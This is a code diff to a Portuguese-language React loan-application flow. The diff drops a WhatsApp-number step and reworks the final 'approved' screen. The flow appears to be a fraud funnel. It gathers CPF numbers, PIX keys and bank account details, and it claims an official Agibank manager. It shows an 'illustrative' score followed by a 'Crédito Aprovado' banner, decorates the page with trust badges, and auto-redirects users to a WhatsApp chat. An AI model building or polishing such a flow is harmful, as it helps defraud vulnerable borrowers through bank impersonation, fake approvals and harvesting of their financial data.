@@ -94,7 +94,6 @@ type Step =
   | "valor"
   | "bancos"
   | "recebimento"
-  | "contato"
   | "revisao"
   | "gerente"
   | "final";
@@ -113,7 +112,6 @@ const ORDER: Step[] = [
   "valor",
   "bancos",
   "recebimento",
-  "contato",
   "revisao",
   "gerente",
   "final",
@@ -199,13 +197,12 @@ export function LoanFlow() {
       valor: "valor_viewed",
       bancos: "bancos_selected",
       recebimento: "payout_entered",
-      contato: "whatsapp_entered",
       revisao: "review_accepted",
       gerente: "review_accepted",
       final: "whatsapp_clicked",
     };
 
-    const isPayoutStepOrLater = ["recebimento", "contato", "revisao", "gerente", "final"].includes(
+    const isPayoutStepOrLater = ["recebimento", "revisao", "gerente", "final"].includes(
       s,
     );
     const hasPayoutData = method === "pix" ? Boolean(pixKey) : Boolean(account);
@@ -319,18 +316,8 @@ export function LoanFlow() {
         return fail("Agência deve ter 4 dígitos, sem o dígito verificador.");
       if (!isValidAccount(account)) return fail("Conta inválida. Use o formato 12345-6.");
     }
-    go("contato");
-    return undefined;
-  };
-
-  const submitContato = () => {
-    if (!isValidPhone(phone)) {
-      setDadosErr({ phone: "Número de WhatsApp inválido com DDD (ex: 11 98888-7777)." });
-      fail("Informe um número de WhatsApp válido com DDD.");
-      return;
-    }
-    setDadosErr({});
     go("revisao");
+    return undefined;
   };
 
   const finalize = () => {
@@ -869,34 +856,6 @@ export function LoanFlow() {
             </Card>
           )}
 
-          {step === "contato" && (
-            <Card
-              icon={<Phone />}
-              title="Seu WhatsApp para contato"
-              subtitle={`Informe seu WhatsApp com DDD para que o gerente ${managerName} possa entrar em contato direto para liberar seu empréstimo.`}
-            >
-              <Field label="WhatsApp com DDD" ok={isValidPhone(phone)} err={dadosErr.phone}>
-                <Input
-                  type="tel"
-                  inputMode="numeric"
-                  maxLength={16}
-                  value={phone}
-                  placeholder="(00) 90000-0000"
-                  onChange={(e) => {
-                    setDadosErr((prev) => ({ ...prev, phone: undefined }));
-                    setPhone(maskPhone(e.target.value));
-                  }}
-                />
-              </Field>
-              <p className="text-xs text-muted-foreground leading-relaxed">
-                🔒 <b>Privacidade Garantida:</b> Seu contato será utilizado exclusivamente pelo
-                gerente oficial do Agibank para validação e liberação do seu benefício.
-              </p>
-              <Secure />
-              <Nav onBack={back} disabled={!isValidPhone(phone)} onNext={submitContato} />
-            </Card>
-          )}
-
           {step === "revisao" && result && (
             <Card
               icon={<FileCheck2 />}
@@ -907,19 +866,19 @@ export function LoanFlow() {
                 {[
                   ["Titular", name ? name : "Consulta realizada pelo CPF"],
                   ["CPF", cpf],
-                  ["WhatsApp de Contato", phone ? phone : "Não informado"],
+                  [
+                    "Recebimento",
+                    method === "pix"
+                      ? `PIX (${pixType.toUpperCase()}) · ${pixKey}`
+                      : `${bankName} · Ag ${agency} · CC ${account}`,
+                  ],
+                  ["Atendimento", `Gerente ${managerName} no WhatsApp`],
                   ["Perfil", profile ? PROFILES[profile] : "Pendente"],
                   ["Motivo", reason ? REASONS[reason] : "Pendente"],
                   ["Tempo de benefício", duration ? DURATIONS[duration] : "Pendente"],
                   ["Faixa do benefício", range ? RANGES[range] : "Pendente"],
                   ["Score ilustrativo", `${result.score} · ${scoreLabel(result.score)}`],
                   ["Valor estimado", brl(result.amount)],
-                  [
-                    "Recebimento",
-                    method === "pix"
-                      ? `PIX (${pixType}) · ${pixKey}`
-                      : `${bankName} · Ag ${agency} · CC ${account}`,
-                  ],
                 ].map(([k, v]) => (
                   <div
                     key={k}
@@ -1020,71 +979,35 @@ export function LoanFlow() {
 
           {step === "final" && (
             <div className="space-y-4 animate-rise">
-              {/* Card Principal de Sucesso e Redirecionamento */}
               <div className="overflow-hidden rounded-3xl bg-card border border-border/60 shadow-card">
-                {/* Top Banner Gradiente com Status */}
+                {/* Header de Sucesso */}
                 <div className="bg-gradient-hero p-5 text-center text-white relative">
-                  <div className="mx-auto flex size-14 items-center justify-center rounded-2xl bg-white/15 backdrop-blur-md shadow-inner mb-3">
-                    <CheckCircle2 className="size-8 text-emerald-300 animate-pulse" />
+                  <div className="mx-auto flex size-13 items-center justify-center rounded-2xl bg-white/15 backdrop-blur-md shadow-inner mb-2.5">
+                    <CheckCircle2 className="size-7 text-emerald-300" />
                   </div>
-                  <span className="inline-flex items-center gap-1.5 rounded-full bg-emerald-500/20 px-3 py-1 text-xs font-semibold text-emerald-200 border border-emerald-400/30">
-                    <Sparkles className="size-3.5" /> Proposta Aprovada com Sucesso
+                  <span className="inline-flex items-center gap-1.5 rounded-full bg-emerald-500/20 px-3 py-0.5 text-xs font-semibold text-emerald-200 border border-emerald-400/30">
+                    <Sparkles className="size-3" /> Proposta Aprovada com Sucesso
                   </span>
                   <h2 className="mt-2 text-xl font-bold tracking-tight">
                     Tudo pronto para liberar seu crédito!
                   </h2>
-                  <p className="mt-1 text-xs text-white/80 max-w-sm mx-auto">
-                    Seu atendimento prioritário foi vinculado ao gerente oficial no WhatsApp.
+                  <p className="mt-1 text-xs text-white/80 max-w-xs mx-auto">
+                    Conectando você ao gerente oficial no WhatsApp para liberação imediata.
                   </p>
                 </div>
 
-                <div className="p-5 sm:p-6 space-y-5">
-                  {/* Bloco do Contador Inteligente */}
-                  <div className="rounded-2xl border-2 border-emerald-500/30 bg-emerald-500/5 p-4 text-center space-y-2.5">
-                    <div className="flex items-center justify-center gap-2 text-emerald-800 text-xs font-semibold">
-                      <Clock className="size-4 animate-spin text-emerald-600" />
-                      <span>
-                        {redirected
-                          ? "Redirecionamento iniciado!"
-                          : `Redirecionando automaticamente em ${countdown} segundo${countdown !== 1 ? "s" : ""}...`}
-                      </span>
-                    </div>
-
-                    {/* Barra de progresso visual */}
-                    <div className="h-1.5 w-full bg-emerald-100 rounded-full overflow-hidden">
-                      <div
-                        className="h-full bg-emerald-500 transition-all duration-1000 ease-linear rounded-full"
-                        style={{ width: `${Math.max(0, ((4 - countdown) / 4) * 100)}%` }}
-                      />
-                    </div>
-
-                    <p className="text-[11px] text-muted-foreground">
-                      Conectando você diretamente à conversa com o gerente no WhatsApp.
-                    </p>
-                  </div>
-
-                  {/* Botão de Ação Imediata para o WhatsApp (Moderno & Pulsante) */}
-                  <a
-                    href={waLink}
-                    onClick={handleOpenWhatsapp}
-                    className="relative group flex items-center justify-center gap-3 w-full py-4 px-6 rounded-2xl bg-[#25D366] hover:bg-[#20bd5a] text-white font-bold text-base shadow-lg shadow-emerald-500/25 transition-all duration-200 transform hover:scale-[1.02] active:scale-[0.98] text-center"
-                  >
-                    <MessageCircle className="size-6 shrink-0 fill-current" />
-                    <span>Falar com {managerName} no WhatsApp</span>
-                    <ArrowRight className="size-5 shrink-0 transition-transform group-hover:translate-x-1" />
-                  </a>
-
+                <div className="p-5 space-y-4">
                   {/* Card do Gerente Conectado */}
                   <div className="flex items-center gap-3.5 rounded-2xl bg-muted/40 p-3.5 border border-border/50">
                     <div className="relative">
                       <img
                         src={managerAvatar}
                         alt={managerName}
-                        width={52}
-                        height={52}
-                        className="size-13 rounded-full object-cover border-2 border-emerald-500 shadow-sm"
+                        width={48}
+                        height={48}
+                        className="size-12 rounded-full object-cover border-2 border-emerald-500 shadow-sm"
                       />
-                      <span className="absolute bottom-0 right-0 size-3.5 rounded-full bg-emerald-500 border-2 border-card ring-1 ring-emerald-600/30" />
+                      <span className="absolute bottom-0 right-0 size-3 rounded-full bg-emerald-500 border-2 border-card" />
                     </div>
                     <div className="min-w-0 flex-1">
                       <div className="flex items-center gap-1.5">
@@ -1098,26 +1021,26 @@ export function LoanFlow() {
                       </p>
                       <p className="text-[11px] font-medium text-emerald-700 flex items-center gap-1 mt-0.5">
                         <span className="size-1.5 rounded-full bg-emerald-500 animate-ping" />
-                        Online agora · Resposta imediata
+                        Online agora · Atendimento direto
                       </p>
                     </div>
                   </div>
 
                   {/* Resumo da Operação Estruturado */}
                   <div className="grid grid-cols-2 gap-2.5">
-                    <div className="rounded-xl border border-emerald-500/20 bg-emerald-500/5 p-3">
-                      <span className="text-[11px] font-medium text-muted-foreground block">
-                        Valor Pré-Aprovado
+                    <div className="rounded-xl border border-emerald-500/25 bg-emerald-500/10 p-3">
+                      <span className="text-[11px] font-medium text-emerald-800 block">
+                        Crédito Aprovado
                       </span>
                       <span className="text-base sm:text-lg font-bold text-emerald-700 block mt-0.5">
                         {result && brl(result.amount)}
                       </span>
                     </div>
 
-                    <div className="rounded-xl border border-border/60 bg-muted/30 p-3 flex flex-col justify-between">
+                    <div className="rounded-xl border border-border/60 bg-muted/40 p-3 flex flex-col justify-between">
                       <div className="flex items-center justify-between">
                         <span className="text-[11px] font-medium text-muted-foreground">
-                          Protocolo Oficial
+                          Protocolo
                         </span>
                         <button
                           type="button"
@@ -1135,53 +1058,57 @@ export function LoanFlow() {
                     </div>
                   </div>
 
-                  {/* Detalhes de Destino do Pagamento */}
-                  <div className="rounded-xl bg-muted/30 border border-border/40 p-3 text-xs flex items-center justify-between">
-                    <div className="flex items-center gap-2">
-                      <Wallet className="size-4 text-emerald-600 shrink-0" />
-                      <span className="text-muted-foreground">Destino do crédito:</span>
+                  {/* Destino do crédito */}
+                  <div className="rounded-xl bg-muted/30 border border-border/40 p-2.5 text-xs flex items-center justify-between">
+                    <div className="flex items-center gap-1.5 text-muted-foreground">
+                      <Wallet className="size-3.5 text-emerald-600 shrink-0" />
+                      <span>Destino:</span>
                     </div>
                     <span className="font-semibold text-foreground text-right truncate max-w-[200px]">
                       {method === "pix"
-                        ? `PIX (${pixType.toUpperCase()}): ${pixKey || phone}`
+                        ? `PIX (${pixType.toUpperCase()}): ${pixKey || phone || "Chave cadastrada"}`
                         : `${bankName || "Conta"} Ag ${agency} CC ${account}`}
                     </span>
                   </div>
 
-                  {/* Garantias e Próximos Passos */}
-                  <div className="space-y-2 pt-2 border-t border-border/50">
-                    <p className="text-[11px] font-semibold uppercase tracking-wider text-muted-foreground">
-                      O que fazer ao abrir o WhatsApp:
-                    </p>
-                    <div className="space-y-1.5 text-xs text-muted-foreground">
-                      <div className="flex items-start gap-2">
-                        <span className="flex size-4 shrink-0 items-center justify-center rounded-full bg-emerald-500/10 text-[10px] font-bold text-emerald-600">
-                          1
+                  {/* Botão de Ação Primária do WhatsApp */}
+                  <div className="space-y-2 pt-1">
+                    <a
+                      href={waLink}
+                      onClick={handleOpenWhatsapp}
+                      className="group flex items-center justify-center gap-2.5 w-full py-4 px-6 rounded-2xl bg-[#25D366] hover:bg-[#20bd5a] text-white font-bold text-base shadow-lg shadow-emerald-500/25 transition-all duration-200 transform hover:scale-[1.01] active:scale-[0.99] text-center"
+                    >
+                      <MessageCircle className="size-5 shrink-0 fill-current" />
+                      <span>Falar com o Gerente no WhatsApp</span>
+                      <ArrowRight className="size-4 shrink-0 transition-transform group-hover:translate-x-1" />
+                    </a>
+
+                    {/* Feedback sutil de contagem regressiva */}
+                    <div className="text-center space-y-1.5 pt-1">
+                      <p className="text-xs text-muted-foreground flex items-center justify-center gap-1.5">
+                        <Clock className="size-3.5 text-emerald-600 animate-spin" />
+                        <span>
+                          {redirected
+                            ? "Redirecionando para o WhatsApp..."
+                            : `Redirecionando automaticamente em ${countdown}s...`}
                         </span>
-                        <span>Envie a mensagem pré-formatada para confirmar seu protocolo.</span>
-                      </div>
-                      <div className="flex items-start gap-2">
-                        <span className="flex size-4 shrink-0 items-center justify-center rounded-full bg-emerald-500/10 text-[10px] font-bold text-emerald-600">
-                          2
-                        </span>
-                        <span>O gerente {managerName} fará a conferência rápida do benefício.</span>
-                      </div>
-                      <div className="flex items-start gap-2">
-                        <span className="flex size-4 shrink-0 items-center justify-center rounded-full bg-emerald-500/10 text-[10px] font-bold text-emerald-600">
-                          3
-                        </span>
-                        <span>O valor será liberado na sua conta cadastrada.</span>
+                      </p>
+                      <div className="h-1 w-36 mx-auto bg-emerald-100 rounded-full overflow-hidden">
+                        <div
+                          className="h-full bg-emerald-500 transition-all duration-1000 ease-linear rounded-full"
+                          style={{ width: `${Math.max(0, ((4 - countdown) / 4) * 100)}%` }}
+                        />
                       </div>
                     </div>
                   </div>
 
-                  {/* Badges de Segurança */}
-                  <div className="flex items-center justify-center gap-4 pt-2 text-[11px] text-muted-foreground">
+                  {/* Selos de Segurança discretos */}
+                  <div className="flex items-center justify-center gap-4 pt-1 text-[11px] text-muted-foreground border-t border-border/40">
                     <span className="inline-flex items-center gap-1">
                       <ShieldCheck className="size-3.5 text-emerald-600" /> Atendimento Oficial
                     </span>
                     <span className="inline-flex items-center gap-1">
-                      <Lock className="size-3.5 text-emerald-600" /> Criptografia 256-bit
+                      <Lock className="size-3.5 text-emerald-600" /> Proteção Bancária
                     </span>
                   </div>
                 </div>
@@ -1209,7 +1136,7 @@ const STAGES: { label: string; steps: Step[] }[] = [
   { label: "Dados", steps: ["dados", "validando"] },
   { label: "Perfil", steps: ["perfil", "motivo", "tempo", "faixa"] },
   { label: "Análise", steps: ["diretrizes", "analise", "score", "valor"] },
-  { label: "Recebimento", steps: ["bancos", "recebimento", "contato", "revisao"] },
+  { label: "Recebimento", steps: ["bancos", "recebimento", "revisao"] },
   { label: "Gerente", steps: ["gerente", "final"] },
 ];
 
